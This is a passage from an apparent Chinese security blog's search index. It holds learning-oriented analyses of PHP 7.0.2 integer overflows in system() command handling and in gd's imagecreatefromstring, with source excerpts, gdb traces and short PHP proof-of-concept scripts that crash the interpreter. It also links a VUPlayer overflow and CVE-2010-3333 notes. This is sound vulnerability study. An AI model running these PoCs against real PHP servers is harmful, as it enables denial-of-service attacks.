</div><div class="line">    type=type@entry=0xae66bb &quot;r&quot;) at /root/php-7.0.2/Zend/zend_virtual_cwd.c:1904</div><div class="line">1904		memcpy(ptr, command, command_length+1);</div><div class="line">(gdb) p command_length+1</div><div class="line">$5 = -15</div><div class="line">(gdb) n</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">__memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:152</div><div class="line">152	../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">&lt;?php</div><div class="line">    ini_set(&apos;memory_limit&apos;, -1);</div><div class="line">    $cmd = str_repeat(&quot;/&quot;, 0xfffffff0);</div><div class="line">    system($cmd);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
<p>我想看到这里也看明白了，正是因为command_length的类型为int，后面再malloc中又转化size_t类型，然后整数溢出了。poc也就那样，很容易理解。不过在linux上的exp还没怎么学习过，后续可能会学习一下。</p>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>这种漏洞现在感觉也很难挖，我看了好几天都没找出一个漏洞，也许因为功力不够吧。如果本章内容讲解错误，欢迎指出。我qq499671216。</p>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://bugs.php.net/bug.php?id=73025" target="_blank" rel="external">https://bugs.php.net/bug.php?id=73025</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[stack-based integer overflow]]></title>
      <url>http://yoursite.com/2017/02/16/stack-based-integer-overflow/</url>
      <content type="html"><![CDATA[<h1 id="Stack-based-integer-overlow（php漏洞挖掘系列之一）"><a href="#Stack-based-integer-overlow（php漏洞挖掘系列之一）" class="headerlink" title="Stack-based integer overlow（php漏洞挖掘系列之一）"></a>Stack-based integer overlow（php漏洞挖掘系列之一）</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>首先声明这些漏洞不是我挖的，我想挖但是挖不出来，蛋疼。本次讲解栈溢出漏洞，这个漏洞是比较常见的漏洞，现在不太好挖了，变量跟踪的你头痛死，没有啥好工具，只能人工慢慢的看，可能我孤陋寡闻吧。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>首先下载源码<a href="http://php.net/releases/，然后编译安装，版本可以低一点，往后的漏洞这个版本都是没打补丁的。环境采用ubuntu和编译版本的php7.0.2，只有linux才有符号表，windows下不好调试，虽然方便的多。现在正式开始吧。" target="_blank" rel="external">http://php.net/releases/，然后编译安装，版本可以低一点，往后的漏洞这个版本都是没打补丁的。环境采用ubuntu和编译版本的php7.0.2，只有linux才有符号表，windows下不好调试，虽然方便的多。现在正式开始吧。</a></p>
<p>定位到漏洞函数代码 /ext/gd/gd.c:2222<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">PHP_FUNCTION(imagecreatefromstring)</div><div class="line">&#123;</div><div class="line">         zval *data;</div><div class="line">         gdImagePtr im;</div><div class="line">         int imtype;</div><div class="line">         char sig[8];</div><div class="line"> </div><div class="line">         if (zend_parse_parameters(ZEND_NUM_ARGS(), &quot;z&quot;, &amp;data) == FAILURE) &#123;</div><div class="line">                   return;</div><div class="line">         &#125;</div><div class="line">         convert_to_string_ex(data);</div><div class="line">         if (Z_STRLEN_P(data) &lt; 8) &#123;</div><div class="line">                   php_error_docref(NULL, E_WARNING, &quot;Empty string or invalid image&quot;);</div><div class="line">                   RETURN_FALSE;</div><div class="line">         &#125;</div><div class="line">         memcpy(sig, Z_STRVAL_P(data), 8);</div><div class="line">         imtype = _php_image_type(sig);</div><div class="line">         switch (imtype) &#123;</div><div class="line">                   case PHP_GDIMG_TYPE_JPG:</div><div class="line">#ifdef HAVE_GD_JPG</div><div class="line">                            im = _php_image_create_from_string(data, &quot;JPEG&quot;, gdImageCreateFromJpegCtx);</div><div class="line">#else</div><div class="line">                            php_error_docref(NULL, E_WARNING, &quot;No JPEG support in this PHP build&quot;);</div><div class="line">                            RETURN_FALSE;</div><div class="line">#endif</div><div class="line">                            break;</div><div class="line">                   case PHP_GDIMG_TYPE_PNG:</div><div class="line">#ifdef HAVE_GD_PNG</div><div class="line">                            im = _php_image_create_from_string(data, &quot;PNG&quot;, gdImageCreateFromPngCtx);</div><div class="line">#else</div><div class="line">                            php_error_docref(NULL, E_WARNING, &quot;No PNG support in this PHP build&quot;);</div><div class="line">                            RETURN_FALSE;</div><div class="line">#endif</div><div class="line">                            break;</div><div class="line">                   case PHP_GDIMG_TYPE_GIF:</div><div class="line">                            im = _php_image_create_from_string(data, &quot;GIF&quot;, gdImageCreateFromGifCtx);</div><div class="line">                            break;</div><div class="line">                   case PHP_GDIMG_TYPE_WBM:</div><div class="line">                            im=_php_image_create_from_string(data,&quot;WBMP&quot;, gdImageCreateFromWBMPCtx);</div><div class="line">                            break；</div><div class="line">                   case PHP_GDIMG_TYPE_GD2:</div><div class="line">                            im = _php_image_create_from_string(data, &quot;GD2&quot;, gdImageCreateFromGd2Ctx);</div><div class="line">                            break;</div><div class="line">                   default:</div><div class="line">                            php_error_docref(NULL, E_WARNING, &quot;Data is not in a recognized format&quot;);</div><div class="line">                            RETURN_FALSE;</div><div class="line">         &#125;</div><div class="line">         if (!im) &#123;</div><div class="line">                   php_error_docref(NULL, E_WARNING, &quot;Couldn&apos;t create GD Image Stream out of Data&quot;);</div><div class="line">                   RETURN_FALSE;</div><div class="line">         &#125;</div><div class="line">         RETURN_RES(zend_register_resource(im, le_gd));</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>有可能上面的代码长了点，但是只要找到关键函数就行了_php_image_create_from_string，在这个函数中的gdNewDynamicCtxEx这个函数才是关键点，跟踪进去就行了。在gd.c:2196行，假如你使用其他版本可能行号不一样，不过没事搜索函数就行了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line">gdImagePtr _php_image_create_from_string(zval *data, char *tn, gdImagePtr (*ioctx_func_p)())</div><div class="line">&#123;</div><div class="line">         gdImagePtr im;</div><div class="line">         gdIOCtx *io_ctx;</div><div class="line">         io_ctx = gdNewDynamicCtxEx(Z_STRLEN_P(data),Z_STRVAL_P(data), 0);  //这边的传入参数的长度为0x80000000  由于是int，所以这边整数溢出。</div><div class="line">………………………………………………………………………………</div><div class="line">gdNewDynamicCtxEx函数代码，行号就不说了。</div><div class="line">gdIOCtx * gdNewDynamicCtxEx (int initialSize, void *data, int freeOKFlag)</div><div class="line">&#123;</div><div class="line">         dpIOCtx *ctx;</div><div class="line">         dynamicPtr *dp;</div><div class="line">         ctx = (dpIOCtx *) gdMalloc (sizeof (dpIOCtx));</div><div class="line">         dp = newDynamic(initialSize, data, freeOKFlag);</div><div class="line">         ctx-&gt;dp = dp; //这边将initialSize 赋值了</div><div class="line">         ctx-&gt;ctx.getC =dynamicGetchar; //这边造成栈溢出，跟踪进去进行了。</div><div class="line">………………………………………………………………………………</div><div class="line"></div><div class="line">newDynamic函数代码</div><div class="line">static dynamicPtr * newDynamic (int initialSize, void *data, int freeOKFlag)</div><div class="line">&#123;</div><div class="line">         dynamicPtr *dp;</div><div class="line">         dp = (dynamicPtr *) gdMalloc (sizeof (dynamicPtr)); // 这边申请了64个字节</div><div class="line">         allocDynamic (dp, initialSize, data);</div><div class="line">………………………………………………………..</div><div class="line">static int</div><div class="line">allocDynamic (dynamicPtr * dp, int initialSize, void *data)</div><div class="line">&#123;</div><div class="line">         if (data == NULL) &#123;</div><div class="line">                   dp-&gt;logicalSize = 0;</div><div class="line">                   dp-&gt;dataGood = FALSE;</div><div class="line">                   dp-&gt;data = gdMalloc(initialSize);  这里的initialSize的值为-2147483648</div><div class="line">         &#125; else &#123;</div><div class="line">                   dp-&gt;logicalSize = initialSize;</div><div class="line">                   dp-&gt;dataGood = TRUE;</div><div class="line">                   dp-&gt;data = data;</div><div class="line">         &#125;</div><div class="line">……………………………………………….</div><div class="line">static int dynamicGetchar (gdIOCtxPtr ctx)</div><div class="line">&#123;</div><div class="line">         unsigned char b;</div><div class="line">         int rv;</div><div class="line">         rv = dynamicGetbuf (ctx, &amp;b, 1);</div><div class="line"> </div><div class="line">………………………………………………………………………………</div><div class="line">static int dynamicGetbuf (gdIOCtxPtr ctx, void *buf, int len)</div><div class="line">&#123;</div><div class="line">         int rlen, remain;</div><div class="line">         dpIOCtxPtr dctx;</div><div class="line">         dynamicPtr *dp;</div><div class="line">         dctx = (dpIOCtxPtr) ctx;</div><div class="line">         dp = dctx-&gt;dp;</div><div class="line">         remain = dp-&gt;logicalSize - dp-&gt;pos;</div><div class="line">         if (remain &gt;= len) &#123;</div><div class="line">                   rlen = len;</div><div class="line">         &#125; else &#123;</div><div class="line">                   if (remain == 0) &#123;</div><div class="line">                            return EOF;</div><div class="line">                   &#125;</div><div class="line">                   rlen = remain;//上面的remain 的值为负数，没有检查，直接比较后赋值，所以导致下面的rlen的值过大造成栈溢出。</div><div class="line">         &#125;</div><div class="line">         memcpy(buf, (void *) ((char *) dp-&gt;data + dp-&gt;pos), rlen); //这边造成了栈溢出</div></pre></td></tr></table></figure></p>
<p>下面是几个结构体，可以对照着去理解代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">typedef struct gdIOCtx &#123;</div><div class="line">         int    (*getC)(struct gdIOCtx*);</div><div class="line">         int    (*getBuf)(struct gdIOCtx*, void*, int);</div><div class="line">         void  (*putC)(struct gdIOCtx*, int);</div><div class="line">         int    (*putBuf)(struct gdIOCtx*, const void*, int);</div><div class="line">         int    (*seek)(struct gdIOCtx*, const int);</div><div class="line">         long (*tell)(struct gdIOCtx*);</div><div class="line">         void  (*gd_free)(struct gdIOCtx*);</div><div class="line">         void  *data;</div><div class="line">&#125; gdIOCtx;</div><div class="line">………………………………………………………………………………</div><div class="line">typedef struct dpStruct</div><div class="line">&#123;</div><div class="line">         void *data;</div><div class="line">         int logicalSize;</div><div class="line">         int realSize;</div><div class="line">         int dataGood;</div><div class="line">         int pos;</div><div class="line">         int freeOK;</div><div class="line">&#125; dynamicPtr;</div><div class="line">………………………………………………………………………………</div><div class="line">typedef struct dpIOCtx</div><div class="line">&#123;</div><div class="line">         gdIOCtx ctx;</div><div class="line">         dynamicPtr *dp;</div><div class="line">&#125; dpIOCtx;</div><div class="line">………………………………………………………………………………</div></pre></td></tr></table></figure></p>
<p>下面是gdb的调试信息,不知道为什么参数的值没有显示出来。有些代码直接阅读比较麻烦，可以gdb调试代码，再调试的同时，打印出它的值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">root@mhn:~# gdb -q --args php-7.0.2/sapi/cli/php -n test.php</div><div class="line">Reading symbols from php-7.0.2/sapi/cli/php...done.</div><div class="line">(gdb) r</div><div class="line">Starting program: /root/php-7.0.2/sapi/cli/php -n test.php</div><div class="line">[Thread debugging using libthread_db enabled]</div><div class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</div><div class="line"> </div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">__memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:118</div><div class="line">118  ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S: No such file or directory.</div><div class="line">(gdb) bt</div><div class="line">#0  __memcpy_sse2_unaligned () at ../sysdeps/x86_64/multiarch/memcpy-sse2-unaligned.S:118</div><div class="line">#1  0x000000000059c1cf in memcpy (__len=18446744071562067968, __src=&lt;optimized out&gt;, __dest=&lt;optimized out&gt;) at /usr/include/x86_64-linux-gnu/bits/string3.h:51</div><div class="line">#2  dynamicGetbuf (ctx=&lt;optimized out&gt;, buf=&lt;optimized out&gt;, len=&lt;optimized out&gt;) at /root/php-7.0.2/ext/gd/libgd/gd_io_dp.c:246</div><div class="line">#3  0x000000000059dd05 in php_gd_fill_input_buffer (cinfo=0x7fffffffaa70) at /root/php-7.0.2/ext/gd/libgd/gd_jpeg.c:607</div><div class="line">#4  0x00007ffff73144e6 in ?? () from /usr/lib/x86_64-linux-gnu/libjpeg.so.8</div><div class="line">#5  0x00007ffff73129ca in ?? () from /usr/lib/x86_64-linux-gnu/libjpeg.so.8</div></pre></td></tr></table></figure></p>
<p>poc就放下面了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">ini_set(&apos;memory_limit&apos;,-1);</div><div class="line">$var_3  =  str_repeat(&quot;A&quot;,0x80000000);</div><div class="line">$var_3[0]=&quot;\xff&quot;;</div><div class="line">$var_3[1]=&quot;\xd8&quot;;</div><div class="line">$var_3[2]=&quot;\xff&quot;;</div><div class="line">imagecreatefromstring($var_3);</div></pre></td></tr></table></figure></p>
<p>这边为什么要替换变量的值呢，由于它上面会检查文件头是否为真实的图片。所以我这边用了jpg的文件头，应该是吧，我也忘了啥文件头，反正只要网上搜索一下图片的文件头就行了。</p>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>说实话我也是初学者，只能这样写一篇文章了，网上的php底层的漏洞挖掘太少了，就只有应用层的代码审计，希望能够给初学者们帮助吧。如果写的有啥不对的地方欢迎指出。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://bugs.php.net/bug.php?id=73280" target="_blank" rel="external">https://bugs.php.net/bug.php?id=73280</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[vuplayer stack overflow]]></title>
      <url>http://yoursite.com/2016/10/11/vuplayer-stack-overflow/</url>
      <content type="html"><![CDATA[<p>一、漏洞环境<br>vuplayer2.49   win7 32</p>
<p>由于win7 没有找到绕过aslr的方法，但是dep绕过了。</p>
<p><a href="https://github.com/whiteHat001/vuplayer/" target="_blank" rel="external">下载地址</a><br>参考资料:<a href="https://www.exploit-db.com/exploits/40172/" target="_blank" rel="external">https://www.exploit-db.com/exploits/40172/</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[cve-2010-3333调试学习笔记]]></title>
      <url>http://yoursite.com/2016/09/23/cve-2010-3333%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>由于第一次分析，难免会有错误，希望能够指出。<br><a href="https://github.com/whiteHat001/cve-2010-3333" target="_blank" rel="external">下载地址</a><br>参考文档:《漏洞战争》</p>
]]></content>
    </entry>
    
  
  
</search>
